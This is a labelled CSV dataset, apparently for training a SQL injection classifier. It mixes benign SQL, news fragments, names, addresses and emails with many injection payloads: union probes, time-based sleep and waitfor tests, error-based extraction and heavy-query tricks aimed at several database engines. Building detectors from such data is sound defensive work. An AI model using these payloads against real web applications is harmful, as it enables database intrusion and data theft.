Query,Label
"SELECT STR_TO_DATE ( ""2017,8,14 10,40,10"", ""%Y,%m,%d %h,%i,%s"" ) ;",0
"1"" )  where 2657 = 2657 and 5309 = 7592--",1
"1'  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
1  )  )   as wrhe where 6120 = 6120 and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,1
"select * from users where id = 1 union select +!<@,version (  )  -- 1",1
"1' or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'wwwb'  =  'wwwb",1
arbizu,0
1'  )   and 7290  =  8416 and   (  'ktlz' like 'ktlz,1
"1  )  )   and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1
33729,0
This include possibility eventual journey times Glasgow Edinburgh London three hours less,0
The 67-year-old finally acknowledged death mother,0
46793939w,0
bscones de ojeda,0
"1"" )  or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
coca de alba,0
taburete,0
descolocado,0
querbico,0
SELECT * FROM wp_posts WHERE ID  =  28635 LIMIT 1,0
"&quot; It &apos;s obviously worrying time &apos;re hopeful back home safely soon possible , &quot; Tunks said",0
1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
"1"" where 3318 = 3318",1
doris,0
"carrer pompeu fabra, 151,",0
"SELECT * FROM of WHERE family BETWEEN ""boat"" AND    ""boat""",0
"-5190%"" or 8298  =  9306 and ""%""  =  """,1
"1%'  )  )   union all select null,null,null#",1
"1""  )  )   and make_set ( 8266 = 9226,9226 )  and   (  (  ""omjx"" like ""omjx",1
pesantez,0
63171354z,0
junquera,0
valdearcos de la vega,0
SELECT TOP 50 PERCENT * FROM wealth,0
"1'+  (  select 'ayod' where 7839  =  7839 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +'",1
SELECT * FROM give,0
SELECT COUNT ( DISTINCT learn )  FROM customs,0
"-8677'||  (  select 'ihpm' from dual where 9571  =  9571 union all select 9571,9571,9571,9571,9571,9571,9571,9571,9571,9571--",1
-7552 or 6872  =  6872,1
brana,0
"1""   )    )     )   union all select null,null#",1
tapia de casariego,0
"-7686%"" )  or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1
SELECT * FROM riding WHERE mountain = 'feet'  OR therefore = 'equipment',0
"This levy reset four operators large power grids , October year",0
"-4960 union all select 4031,4031#",1
DELETE FROM method,0
SELECT * FROM rain 3,0
"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",1
"-2953""  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""oaeh""  =  ""oaeh",1
The precise cause fire initially unclear,0
According Green Party MP,0
SELECT connected ( s ) FROM complex INNER JOIN,0
Airbus says commissioned research suggesting extra inch seat width improves sleep quality 53 per cent,0
Lu Ng (2010) uses dynamic conditional random fields perform sentence boundary sentence type prediction,0
You &apos;t state government ripping almost half-a-billion dollars Commonwealth put $ 300 million pretend &apos;s good news day,0
"1""  )   union all select null,null,null,null,null--",1
SELECT * FROM fellow FETCH FIRST 50 PERCENT ROWS ONLY,0
"-4535'  )   union all select 8491,8491,8491,8491,8491,8491--",1
ac40cent0,0
"1'+ ( select 'gqsk' where 3087 = 3087 union all select null,null,null,null--",1
SELECT AVG ( forest ) FROM drop SELECT SUM ( eat ),0
"1' )  as ildf where 5545 = 5545 union all select null,null,null,null#",1
Unknown attackers injure girl shots fired car Unknown attackers injured twelve-year-old girl Saxony-Anhalt firing shots car,0
9867,0
SELECT * FROM deep FETCH FIRST 3 ROWS ONLY,0
1320,0
60,0
"1'  )  )   or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (  'esma' like 'esma",1
"-1171' union all select 3958,3958,3958,3958,3958--",1
"1""   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   ""bfko""  =  ""bfko",1
werkmeister@19horas.zr,0
There treatments delay early menses ward another consequence: premature aging bones ultimately lead stunted growth short adult,0
"buidaoli, 49, 12-g",0
37439,0
SELECT TOP 3 * FROM wild WHERE laid = 'same' SELECT * FROM provide,0
hoeflich@movil-google.cx,0
SELECT * FROM lower WHERE social = 'probably',0
"-6546""  )   order by 1#",1
SELECT COUNT ( DISTINCT visit )  FROM growth,0
"SELECT frozen AS pen, seat AS [mistake]  FROM standard",0
"-6400   )    )    union all select 4650,4650,4650--",1
"1""  )   where 8153  =  8153",1
"1' )  where 8125 = 8125 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) --",1
cigales,0
"SELECT fullID AS ID, whether AS exercise FROM speech",0
del cid labastie,0
bablica,0
"1 )  where 8474 = 8474 or 5356 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
sobaquera,0
trinidad,0
"1' )  and elt ( 1210 = 1210,sleep ( 5  )  )   and  ( 'udvq' = 'udvq",1
1g5ota323,0
83607535m,0
"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
4381135407580429,0
63269334z,0
"select * from users where id = 1 or @#"". = 1 or 1 = 1 -- 1",1
or 1 = 1/*,1
9687551942893066,0
lugar grela 152 1?f,0
"1   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  3504  =  3504",1
"1'|| ( select 'uvbb' where 7795 = 7795 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null  )  )  ||'",1
SELECT COUNT ( DISTINCT stick )  FROM swimming,0
"1'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'gcna'  =  'gcna",1
97925933y,0
34105397p,0
"1%' )  and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and  ( '%' = '",1
47450,0
"c/ arago 194,",0
4ns38a5o4,0
SELECT * FROM dozen FETCH FIRST 3 ROWS ONLY,0
gandolfo,0
SELECT * FROM truck WHERE chair = 'maybe',0
"-2033"" )  or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1
-6777%' )  or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and  ( '%' = ',1
"Hemingway told story fighter , courageous man &apos;t give ultimately wins battle fish result knowledge strong",0
8961254211923124,0
dasie,0
3945930000000000,0
99783130e,0
naca39,0
664228000000000,0
SELECT * FROM shot  WHERE break NOT LIKE '[plenty]%',0
"1"" and elt  (  2373  =  5817,5817  )   and ""rsdt""  =  ""rsdt",1
"1 union all select null,null,null,null,null#",1
dana,0
"SELECT COUNT ( answer ) , stared FROM anywhere BY lady",0
SELECT goose FROM than UNION ALL SELECT cent FROM dull ORDER BY skin,0
pozaldez,0
"""a"""" or 1 = 1--""",1
1'  )   and sleep  (  5  )   and   (  'xecl' like 'xecl,1
50345,0
"-9156'  )  )   union all select 9110,9110,9110,9110#",1
9oautora,0
3628286866594079,0
"-5320 where 8051 = 8051 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --",1
"The celebrations get way Friday , &quot; Stoppelacker &quot; (Stubble Field) party featuring DJ Ralf",0
"-1600%""  )  )   )  or elt ( 4568 = 7693,7693 )  and   (  (   ( ""%"" = """,1
"1'   )    )    as hbdi where 6758  =  6758 and elt  (  1210  =  1210,sleep  (  5   )    )   --",1
"1' and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and 'ulep' = 'ulep",1
64575959d,0
muenpasitiwet@magritte.gov,0
SELECT * FROM satellites FETCH FIRST 3 ROWS ONLY,0
tegenes,0
srdida.me3te,0
"SELECT * FROM gravity ORDER BY arrive, strange",0
3602040000000000,0
"1  )   as kzyb where 7023  =  7023 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   7749  =  7749",1
SELECT * FROM glad 3 SELECT * FROM all,0
"select pg_sleep ( 5 )  and   (  (  ""%"" = """,1
celia,0
-7041'  )   where 6307  =  6307 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1
constante,0
matas,0
"1""  )   as wxea where 6394  =  6394 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
1   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
"SELECT * FROM skin WHERE make NOT IN  ( 'correctly', 'ring', 'invented' )",0
1'  )   rlike sleep  (  5  )   and   (  'qsub' like 'qsub,1
"INSERT INTO piano ( later, separate, teach, appropriate, idea, dish )  VALUES  ( 'experience', 'use'. return', 'doctor', 'audience', 'examine', 'opinion' )",0
1%'  )  )   )  order by 1#,1
"But man is, were, clapped jail consciousness",0
geldof@fok.ye,0
versini@clubdecampo.com.bi,0
"select * from users where id = 1 or ""%{"" or 1 = 1 -- 1",1
"1"" or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and ""uvoq"" like ""uvoq",1
SELECT * FROM discover WHERE high = 'grandmother'  OR island = 'under',0
"But mice given vaccine &quot; chilled , &quot; say researchers , sign nicotine reached brains",0
Oil extends drop toward $ 96 barrel The price oil continued fall Friday concerns high supplies offset report showing China &apos;s power-hungry manufacturing sector strengthening,0
"-9456%""   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   ""%""  =  """,1
"1' )  where 8211 = 8211 union all select null,null,null,null,null#",1
ha6agar,0
"1%""  )  )   union all select null,null,null,null,null,null,null,null,null,null--",1
The teenager &apos;s parents said hope video footage contain clues died,0
1 )  as bhdj where 4472 = 4472,1
8201,0
SELECT COUNT ( fliesID ) FROM clock,0
7onom9niaca,0
select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,1
1  )   as zodp where 9112  =  9112,1
97060354d,0
"They best names , like &quot; Terror Behind Walls &quot; (which , way actual prison), &quot; Howl-O-Scream &quot; &quot; The House Shock",0
"1 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367589 ),0
imre,0
SELECT * FROM parallel WHERE felt = 'examine',0
roe,0
"1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#",1
bjorn,0
16582,0
"1'   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'sied'  =  'sied",1
aana,0
"However , Damascus still start destroying existing weapons stockpiles",0
"calle batalla de otumba 26,",0
pavlow@permutatucasa.fm,0
7583890379589954,0
SELECT your ( s )  FROM onto FULL OUTER JOIN,0
79332858q,0
"select * from users where id  =  1 or ""..""  =  1 or 1  =  1 -- 1",1
99508422a,0
stacey@mediacar.la,0
1 where 7425 = 7425 rlike  ( select  ( case when  ( 4056 = 3196 )  then 1 else 0x28 end  )  )  --,1
The Narrenzunft Strohglonki (Strohglonki Fool &apos;s Guild celebration) begins 8 February evening traditional customs occasion 60-year anniversary / The Harmonie Gutmadingen music association turn 90 years old 29 March hold celebratory banquet 1 4 May celebrating Bezirksfest &#91; District Music Festival &#93;,0
"The south stand , hand , loyal - loudest - BVB fans stand , initially unusually quiet: No singing battle cries",0
kristel,0
"1'  )  )   )  or elt ( 6272 = 6272,sleep ( 5  )  )   and   (  (   ( 'ayjb' like 'ayjb",1
1 where 6434  =  6434,1
It really daring,0
"-7553%"" or 3571 = 2886",1
"( select  ( case when  ( 3531 = 3531 )  then  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  else 3531 end  )  )",1
1 )  as usnn where 3201 = 3201,1
plza. nuestra seora de los reyes 98,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 3792 )  ORDER BY meta_id ASC",0
"c/ de las gloxinias 91,",0
60613075w,0
gracomda7,0
"calle joaquin gamon 175, 2-c",0
or 'text' > 't',1
"1%""  )  )   and elt ( 7633 = 4110,4110 )  and   (  (  ""%"" = """,1
5e011llo,0
1%' )  or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and  ( '%' = ',1
"1%""  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""%""  =  """,1
He could enter factory wearing hair protection white coat,0
According State Government additional elective procedures largely reverse recent cuts,0
zaqueo,0
1%'  )  )   )  and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #,1
"-1917""  )   or 8571  =  8571--",1
""";waitfor delay '0:0:__TIME__'--",1
-5299 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ),1
SELECT certainly ( s )  FROM compare FULL OUTER JOIN,0
"1'|| ( select 'epjf' from dual where 8584 = 8584 and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
"SELECT POSITION ( ""3"" IN ""W3Schools.com"" )  AS MatchPosition;",0
SELECT AVG ( Price ) FROM safe,0
SELECT COUNT ( arrow ) FROM lunch,0
"SELECT givenID AS ID, bus AS dust FROM goose",0
SELECT * FROM enough FETCH FIRST 50 PERCENT ROWS ONLY,0
heldo,0
maclaren,0
asc,1
net /usr/lib/sendmail bbs338 12 view 120,0
xixia,0
khalid,0
SELECT * FROM bean WHERE raw IN  ( SELECT engineer FROM deer ),0
cifelli,0
valdeolivas,0
31439,0
"botellas, 97 9a",0
guasca,0
doroteya,0
cruey,0
huyente,0
They never believed died way sheriff concluded,0
"SELECT * FROM vapor ORDER BY adjective, consider",0
SELECT * FROM deep WHERE NOT sky = 'tent'  AND NOT who = 'crew',0
SELECT TOP 50 PERCENT * FROM saved SELECT * FROM detail FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM two,0
-4518 where 8023  =  8023 or 6872  =  6872--,1
katcher,0
1'  )  )   as nhkp where 8030 = 8030,1
SELECT * FROM mighty WHERE NOT guard = 'distance'  AND NOT far = 'government',0
SELECT support ( s )  FROM swung FULL OUTER JOIN,0
57i-9557a,0
-7242' or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'kfff'  =  'kfff,1
horst@engibraltar.com.co,0
-7293'  )  )   )  or 3038 = 3038,1
&quot; They comers two walked gold cup rosette,0
"The magnetic activity star , interaction magnetic field emitted particle radiation play important role",0
"The student volunteers usually pay way Cameroon , often arriving donated medical supplies",0
540,0
1'|| ( select 'dsjg' where 2402 = 2402 and 1947 = 7472--,1
terl6z,0
cecile,0
SELECT * FROM mean WHERE gentle BETWEEN 'thy' AND 'green',0
SELECT DISTINCT shadow FROM dog,0
"Obviously , elective office &apos;t predictable course , opposing political party random events , Newtown massacre , shape public conversation",0
"Therefore , I hope players finally managed clear heads short break",0
joux@viajessolomujeres.nf,0
93611037w,0
"-3633'  )   where 3513  =  3513 union all select 3513,3513,3513,3513,3513,3513,3513,3513,3513,3513#",1
"SELECT * FROM until WHERE been BETWEEN ""private"" AND    ""piece""",0
SELECT ocean ( s )  FROM wolf UNION,0
"andador carlos lapetra 191, 5c",0
-8023' or 6872 = 6872,1
7205,0
SELECT * FROM manufacturing WHERE let NOT LIKE 'just%',0
2753394337556822,0
joya,0
"The meeting point tours Cologne Tourism Service Centre , right cathedral",0
2301580000000000,0
"-1351"" where 6968 = 6968 or 5684 = 8582",1
"1'||  (  select 'goxu' where 9215  =  9215 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
"select sleep  (  5  )   and ""jvys"" like ""jvys",1
SELECT reach ( s ) FROM rear INNER JOIN,0
Dieter Thomas Kuhn Stuttgart: The &quot; singing mountain wave &quot; open-air stage Stuttgart - &quot; When summer ? &quot; actually question people &apos;s lips Killesberg Open-Air Theatre Friday evening,0
"1""  )   as fcrx where 2929  =  2929 and 2820  =  5133",1
"select * from users where id = 1 or ""?["" or 1 = 1 -- 1",1
"&quot; With hundreds thousands receiving cancellation notices providers , Republicans slammed president recent days misleading American public",0
sadeghi,0
38370,0
"1 )  where 7815 = 7815 union all select null,null,null,null,null,null,null#",1
"Under new bill , media houses fined 20 million Kenyan shillings individual journalists one million additional risk &quot; de-listed , &quot; barred receiving official press accreditation",0
sandler,0
"paseo constitucion, 10,",0
reiji,0
SELECT * FROM agree WHERE    NOT labor = 'action',0
sol,0
"The deadline applications Monday 11 November , 6: 00 p",0
"calle perez galdos 193,",0
SELECT TOP 3 * FROM among WHERE cook = 'someone' SELECT * FROM chance,0
1'+ ( select gkve where 1943 = 1943 waitfor delay '0:0:5' ) +',1
2473970000000000,0
SELECT * FROM CustomersFETCH FIRST 3 ROWS ONLY,0
"1""  )  )",1
"Five matches scheduled team , every team playing one match others",0
bullicioso,0
chung,0
7058252446193830,0
otmar,0
"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,1
SELECT * FROM south WHERE distance = 'temperature'  AND City = 'rope',0
"1' in boolean mode )  or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
2.28251E+015,0
1  )   as crsd where 5271  =  5271 waitfor delay '0:0:5'--,1
"1"" and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and ""endx"" = ""endx",1
"-1644%' or make_set  (  9354  =  9354,7185  )   and '%'  =  '",1
"1"" where 6281 = 6281 or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
"1%"" and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and ""%"" = """,1
oliveira,0
SELECT option_value FROM wp_options WHERE option_name  =  'options_footer_button_3_text' LIMIT 1,0
"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",1
"SELECT * FROM broad ORDER BY took ASC, happened DESC",0
The Guangzhou-based New Express made rare public plea release journalist Chen Yongzhou,0
50582,0
"1%""  )   union all select null,null,null,null,null#",1
"We come wear one cut face figure, acquire degrees gentlest asinine expression",0
"c/ salvatella, 98 11?h",0
"1"" and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )",1
"1   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"1"" )  as qmtx where 5280 = 5280 or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
"1' )  where 6489 = 6489 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 ) --",1
"calle mercurio, 19,",0
SELECT TOP 3 * FROM down WHERE quarter = 'fifty',0
"1"" where 7245 = 7245 and 9198 = 9198--",1
typer0,0
c/ cristobal quintero 86,0
espinosa@chicashumedas.net,0
caball,0
malen,0
cholgua,0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""%""  =  """,1
7011,0
themselves-ignez@powerthink.cx,0
SELECT COUNT ( DISTINCT date )  FROM ground,0
5323,0
"1""  )   where 7957  =  7957 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
infalibilidad,0
"My sister I allowed eat candy , stay late play dress-up neighborhood",0
cl5m9,0
20629413t,0
1' )  and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and  ( 'ayol' = 'ayol,1
"select * from users where id = 1 union select 1,banner from v$version where rownum = 1 -- 1",1
SELECT * FROM  ( SELECT garden FROM fair ),0
"SELECT Orders.fallenrID, Employees.ranch, Employees.worry FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.heldID ORDER BY Orders.biteID",0
corota,0
SELECT * FROM sharp WHERE cool = 'start' LIMIT 3,0
SELECT * FROM stick WHERE natural LIKE '%anything%',0
goble,0
Other doctors attending AAP conference reinforced complexities topic,0
SELECT orbit ( s )  FROM orange FULL OUTER JOIN,0
"SELECT nest, leave+ ', ' + wool+ ' ' + coffee+ ', ' + top AS greater  FROM rod",0
"Ruins measuring five metres tall , made stones around size palm hand , waiting discovered",0
"1%'  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
1'  )   as znak where 5203  =  5203,1
reaves-phillips@baybay.tm,0
"1' )  or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and  ( 'uwbh' = 'uwbh",1
"SELECT * FROM examine WHERE hello IN  ( 'shoot', 'happy', 'ball' )",0
SELECT whistle ( s )  FROM mine FULL OUTER JOIN,0
gelis,0
SELECT weigh ( s )  FROM pole FULL OUTER JOIN,0
"1' )  and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and  ( 'rvwk' = 'rvwk",1
7701,0
"1' )  where 4092 = 4092 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",1
saviange_files@zytel.nc,0
1'+  (  select 'rkap' where 9692  =  9692,1
"1' and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   and 'pphf' = 'pphf",1
"We found vast majority businesses looking export outside Europe , focusing countries modernising growing EU states stagnate",0
4789967077221120,0
1' where 1017 = 1017 and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --,1
SELECT movement FROM fuel UNION SELECT boat FROM wool ORDER BY positive,0
acordelar,0
50780,0
"1""   )    )    as rign where 1604  =  1604 and 3661  =  3054--",1
SELECT Count ( * )  AS army,0
carrer vidal i barraquer 28,0
47343175k,0
"calle marsella s/n,",0
SELECT TOP 3 * FROM particular WHERE except = 'ranch' SELECT * FROM double,0
SELECT * FROM  ( SELECT maybe FROM moment ),0
vislumbrar,0
"1' in boolean mode )  or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
